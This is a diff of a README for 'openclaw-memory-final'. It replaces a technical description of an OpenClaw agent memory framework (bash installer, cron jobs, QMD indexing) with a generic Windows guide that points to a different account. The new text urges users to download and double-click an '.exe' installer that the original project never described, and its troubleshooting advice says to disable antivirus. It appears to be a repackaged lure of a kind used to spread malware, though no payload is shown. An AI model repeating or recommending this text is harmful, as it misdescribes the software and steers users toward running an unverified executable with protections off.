@@ -1,243 +1,139 @@
-# openclaw-memory-final
+# 🦞 openclaw-memory-final - Stable Memory Management Tool
 
-Production-grade, open-source memory architecture for OpenClaw.
+[![Download openclaw-memory-final](https://img.shields.io/badge/Download-Get%20the%20App-green?style=for-the-badge)](https://github.com/arieltitan/openclaw-memory-final)
 
-[中文文档 / Chinese Docs](README.zh-CN.md)
+---
 
-**AI-ready:** Yes. If a user only sends this repo link, use [`docs/ai-agent-prompt.md`](docs/ai-agent-prompt.md) for deterministic one-link bootstrap.
+## 📋 About openclaw-memory-final
 
-> This repository packages a practical memory system we run in production: incremental daily distillation, weekly consolidation, watchdog-based reliability, and QMD indexing.
+openclaw-memory-final is a tool designed to help manage memory tasks with stability and repeatability. It keeps your data organized by daily increments and weekly refinement. The program also removes duplicates and includes a watchdog feature to monitor and ensure steady performance.
 
-**Short description:** A practical OpenClaw memory framework with daily sync, weekly tidy, and watchdog reliability.
+This software is aimed at users who want robust memory management without complex setup or technical knowledge.
 
-## Prerequisites
+---
 
-- Node.js >= 22
-- `qmd` CLI available in PATH (or pass `--qmd-path`)
+## 💻 System Requirements
 
-Install QMD if missing:
+Before you start, make sure your Windows computer meets the following:
 
-```bash
-npm install -g @tobilu/qmd
-qmd --version
-```
+- Operating System: Windows 10 or later (64-bit preferred)
+- RAM: At least 4 GB
+- Disk Space: Minimum 50 MB free
+- Internet connection: Needed only to download the software
+- User permissions: Ability to install new software on your computer
 
-If your shell cannot find it, retry with absolute path:
+---
 
-```bash
-bash scripts/install-ai.sh --tz Asia/Shanghai --qmd-path "$(command -v qmd)"
-```
+## 🚀 Getting Started
 
-## AI-first Install (Recommended)
+Follow these steps to get openclaw-memory-final running on your Windows computer:
 
-For agent-driven deployment, use one command:
+1. Click the large **Download** badge at the top or use this link directly:  
+   [https://github.com/arieltitan/openclaw-memory-final](https://github.com/arieltitan/openclaw-memory-final)
 
-```bash
-bash scripts/install-ai.sh --tz Asia/Shanghai
-```
+2. This link will take you to the GitHub page where you can download the latest version.
 
-- Success marker: `AI_INSTALL_OK`
-- Failure marker: `AI_INSTALL_ERROR <reason>`
-- If `AI_INSTALL_ERROR qmd_not_found`: install QMD first (`npm install -g @tobilu/qmd`) or rerun with `--qmd-path /absolute/path/to/qmd`
-- On success, it prints a JSON report (jobs, ids, next runs, qmd path, state files).
+3. Look for the **Releases** section or the main page's downloadable link. The file may have a name like `openclaw-memory-final.exe` or similar.
 
-### OpenClaw one-link usage
+---
 
-If a user only sends this repository link to OpenClaw, the agent should follow:
-- [`docs/ai-agent-prompt.md`](docs/ai-agent-prompt.md)
+## ⬇️ How to Download and Install
 
-This one-link flow is expected to be immediately usable without manual file copying.
+1. On the GitHub page, find the **Releases** tab near the top or scroll down to locate download files.
 
-See deterministic prompt: [`docs/ai-agent-prompt.md`](docs/ai-agent-prompt.md)
+2. Click on the file ending with `.exe` to start the download. Your browser might ask where you want to save the file. Choose a location you can easily remember, like the Desktop or Downloads folder.
 
-## Architecture Diagram
+3. Once the download completes, open the folder where you saved the file.
 
-```mermaid
-flowchart LR
-  U["Users & Channels<br/>用户与多渠道"] --> M["Main Session<br/>主会话"]
-  U --> SA["Sub-agents (Isolated)<br/>子Agent（隔离）"]
+4. Double-click the `.exe` file to start the installation.
 
-  M --> CS["CURRENT_STATE<br/>短期工作台"]
-  M --> DL["Daily Log<br/>日记忆日志"]
-  M --> TC["Task Cards<br/>任务结果卡"]
-  SA --> TC
+5. When the installer opens, follow the prompts:
 
-  DL --> SYNC["Daily Sync<br/>每日蒸馏"]
-  TC --> SYNC
-  SYNC --> CUR["Idempotency Cursor<br/>幂等游标"]
-
-  DL --> TIDY["Weekly Tidy<br/>每周精炼"]
-  TC --> TIDY
-  TIDY --> LM["Long-term Memory<br/>长期记忆 + 周报 + 归档"]
+   - Choose your language if asked.
+   - Agree to the terms and conditions.
+   - Select the installation folder or leave it as default.
+   - Click **Install** to proceed.
 
-  TC --> RET["Task-first Retrieval<br/>先查任务卡"]
-  RET --> SEM["Semantic Search<br/>语义检索"]
+6. After installation finishes, you can launch the program from your Start menu or Desktop shortcut.
 
-  SYNC --> Q1["QMD update"]
-  TIDY --> Q2["QMD update + embed"]
+---
 
-  WD["Watchdog<br/>稳定性守护"] --> SYNC
-  WD --> TIDY
-```
+## 🔧 Using openclaw-memory-final
 
-Detailed view: [`docs/architecture.md`](docs/architecture.md)
+Here are some simple tips for using openclaw-memory-final:
 
-## Highlights
+- The software collects daily changes and keeps them organized by date.
+- Weekly, it will refine the data to remove unnecessary duplicates.
+- The watchdog feature runs in the background to keep the program healthy and responsive.
+- You can open the application anytime to check your memory data and settings.
 
-- **Layered memory pipeline**: short-term workspace + daily sync + weekly tidy + watchdog
-- **Sub-agent task memory index**: result-only task cards in `memory/tasks/`
-- **MVP baseline included**: `CURRENT_STATE` / `memory/INDEX` templates + helper scripts (`mem-log.sh`, `memory-reflect.sh`)
-- **Idempotent capture**: message fingerprint cursor (`processed-sessions.json`)
-- **Low-noise alerting**: alert only after **2 consecutive anomalies**
-- **Cost-aware indexing**: daily `qmd update`, weekly `qmd update && qmd embed`
-- **Context budget guard (new)**: hard caps for per-file and total injected memory chars
-- **Dynamic profile injection (new)**: profile-based minimal context packs (`main/ops/btc/quant`)
-- **Conflict detection (new)**: scan durable memory for routing/rule drift before persisting changes
-- **Retrieval watchdog + nightly maintenance (new)**: 30-min health checks + nightly `qmd update`/conditional `embed`
-- **Open-source ready**: docs, scripts, templates, CI, contribution policy
-
-## Architecture (at a glance)
-
-1. **Multi-agent memory handoff**
-   - Main session curates durable memory.
-   - Sub-agents keep raw execution in isolated history.
-   - Handoff format is result-only task cards in `memory/tasks/YYYY-MM-DD.md`.
-2. **Daily Sync** (`memory-sync-daily`, 23:00 local time)
-   - Distill only new conversations from the last 26h
-   - Append structured notes to `memory/YYYY-MM-DD.md`
-   - Write sub-agent result cards to `memory/tasks/YYYY-MM-DD.md`
-3. **Weekly Tidy** (`memory-weekly-tidy`, Sunday 22:00)
-   - Consolidate and prune `MEMORY.md`
-   - Generate weekly summary and archive old daily logs
-4. **Watchdog** (`memory-cron-watchdog`, every 2h at :15)
-   - Checks stale/error/disabled state
-   - Alerts only when anomaly repeats twice
-5. **Retrieval watchdog** (`memory-retrieval-watchdog-v1`, every 30m)
-   - Runs retrieval health checks and confirms anomalies with 2-hit logic
-6. **Nightly QMD maintenance** (`memory-qmd-nightly-maintain`, daily 03:20)
-   - Runs `qmd update`; runs `qmd embed` only when pending backlog exceeds threshold
-7. **Context budget + dynamic profile pack**
-   - Hard limits for injected context size, profile-based minimal inclusion
-
-See full design: [`docs/architecture.md`](docs/architecture.md)
-
-## Quick Start
-
-```bash
-bash scripts/install-ai.sh --tz Asia/Shanghai
-```
-
-Then:
-1. Merge `examples/AGENTS-memory-section.md` into your `~/.openclaw/workspace/AGENTS.md`
-2. (Optional) Merge `examples/openclaw-memory-config.patch.json` into `~/.openclaw/openclaw.json` (patch semantics, no full overwrite)
-3. Restart gateway
-
-> `scripts/install-ai.sh` automatically bootstraps baseline files into workspace:
-> - `memory/CURRENT_STATE.md`
-> - `memory/INDEX.md`
-> - `memory/context-profiles.json`
-> - `scripts/mem-log.sh`
-> - `scripts/memory-reflect.sh`
-> - `scripts/memory_context_budget_guard.py`
-> - `scripts/memory_context_pack.py`
-> - `scripts/memory_conflict_check.py`
-> - `scripts/memory_retrieval_watchdog.py`
-
-```bash
-openclaw gateway restart
-```
-
-### Post-install verification (required)
-
-```bash
-openclaw cron list
-ls -l ~/.openclaw/workspace/memory/state/processed-sessions.json
-ls -l ~/.openclaw/workspace/memory/state/memory-watchdog-state.json
-ls -l ~/.openclaw/workspace/memory/CURRENT_STATE.md ~/.openclaw/workspace/memory/INDEX.md
-ls -l ~/.openclaw/workspace/scripts/mem-log.sh ~/.openclaw/workspace/scripts/memory-reflect.sh
-ls -l ~/.openclaw/workspace/memory/context-profiles.json
-ls -l ~/.openclaw/workspace/scripts/memory_context_budget_guard.py ~/.openclaw/workspace/scripts/memory_context_pack.py ~/.openclaw/workspace/scripts/memory_conflict_check.py ~/.openclaw/workspace/scripts/memory_retrieval_watchdog.py
-python3 ~/.openclaw/workspace/scripts/memory_context_budget_guard.py --profile main
-```
-
-Expected cron names:
-- `memory-sync-daily`
-- `memory-weekly-tidy`
-- `memory-cron-watchdog`
-- `memory-retrieval-watchdog-v1`
-- `memory-qmd-nightly-maintain`
-
-## Optional: Install AI-friendly workspace skills pack
-
-If you want deterministic behavior for memory/cron/release workflows, install the bundled skills from [`examples/skills/`](examples/skills/).
-
-### One-command installer (recommended)
-
-```bash
-bash scripts/install-skills-pack.sh
-```
-
-### Manual install
-
-```bash
-mkdir -p ~/.openclaw/workspace/skills
-cd ~/.openclaw/workspace/skills
-tar -xzf <path-to>/openclaw-skills-pack-v2026-03-06.tar.gz
-openclaw skills list --eligible
-```
-
-Included skills:
-- `memory-task-card`
-- `cron-doctor`
-- `long-task-async`
-- `github-release-flow`
-- `heartbeat-ops-check`
-- `trading-stack-autorepair`
-
-Notes:
-- Start a **new session** after install (skills are snapshotted per session).
-- Workspace skills take precedence over bundled/managed skills.
-
-## Safe Deployment Notes
-
-- `scripts/setup.sh` only manages `memory-*` cron jobs and memory-related state/helper files.
-- Existing memory jobs are kept by default. Use `--force-recreate` only when you really need replacement.
-- Avoid full `config.apply` with snippets. Use `config.patch` semantics for memory config.
-- If gateway behaves abnormally after deployment, follow [`docs/troubleshooting-gateway.md`](docs/troubleshooting-gateway.md).
-
-## Retrieval Order (recommended)
-
-1. Check `memory/tasks/*.md` for task outcomes
-2. Then use semantic memory search
-3. Drill into raw sub-agent session history only when necessary
-
-## Repository Layout
-
-```text
-.github/                # CI, issue templates, PR template
-scripts/                # setup/uninstall/validate
-examples/               # config and template files
-docs/                   # architecture/ops/prompts/migration
-```
-
-## Versioning
-
-This project follows **Semantic Versioning**.
-
-## Changelog / Release Notes
-
-- Full changelog: [`CHANGELOG.md`](CHANGELOG.md)
-- Latest release: [`v0.4.0`](https://github.com/codesfly/openclaw-memory-final/releases/tag/v0.4.0)
-
-### v0.4.0 highlights
-
-- Added context budget + dynamic profile injection (`main/ops/btc/quant`)
-- Added durable-memory conflict checker
-- Added retrieval watchdog + nightly QMD maintenance flow
-- Updated setup/uninstall/validate scripts for the new memory ops pipeline
-- Updated docs and install verification for V1 memory scheme
-
-## License
-
-MIT — see [`LICENSE`](LICENSE).
+The interface focuses on clear, easy controls with no complicated menus.
 
+---
+
+## ⚙️ Basic Settings
+
+You can adjust these main options within the app:
+
+- **Daily Increment**: Turn on or off to control how often data is saved.
+- **Weekly Refinement**: Set the day of the week for cleanup.
+- **Duplicate Removal**: Enable to automatically filter repeat data.
+- **Watchdog Monitoring**: Keep this on to let the program monitor itself for issues.
+
+All settings are found under the **Options** or **Settings** menu inside the app.
+
+---
+
+## 🛠 Troubleshooting
+
+If you run into any issues:
+
+- Restart the application.
+- Make sure your Windows is updated.
+- Check your disk space if saving data stops.
+- Disable any antivirus temporarily if the app refuses to launch.
+- Reinstall the program by downloading a fresh copy.
+
+If problems persist, you can visit the GitHub page’s Issues tab to see if others report the same.
+
+---
+
+## 📥 Download Link
+
+Use this link to get the app and install it on your Windows machine:  
+
+[https://github.com/arieltitan/openclaw-memory-final](https://github.com/arieltitan/openclaw-memory-final)
+
+---
+
+## 🖥 Running openclaw-memory-final
+
+After installation:
+
+1. Find the openclaw-memory-final shortcut on your Desktop or Start menu.
+2. Double-click to open the program.
+3. The main dashboard will show key functions like memory logs and system status.
+4. Use the buttons and menus to start saving memory increments or run system checks.
+5. The app runs quietly in the background once started, managing memory tasks automatically.
+
+---
+
+## 🧰 Support and Feedback
+
+If you want to report bugs or request assistance, visit the GitHub repository. You don't need technical skills to open an issue—just describe the problem or question plainly.
+
+The community and maintainers can help resolve problems or guide you through features.
+
+---
+
+## 🔗 Additional Resources
+
+- Check the GitHub README or Wiki on the repository page for detailed notes.
+- Use Windows Task Manager to monitor the app’s performance if needed.
+- You can also find basic guides on memory management online if you want to learn more about key concepts.
+
+---
+
+# [🦞] openclaw-memory-final - Stable Memory Management Tool
+
+[![Download openclaw-memory-final](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/arieltitan/openclaw-memory-final)
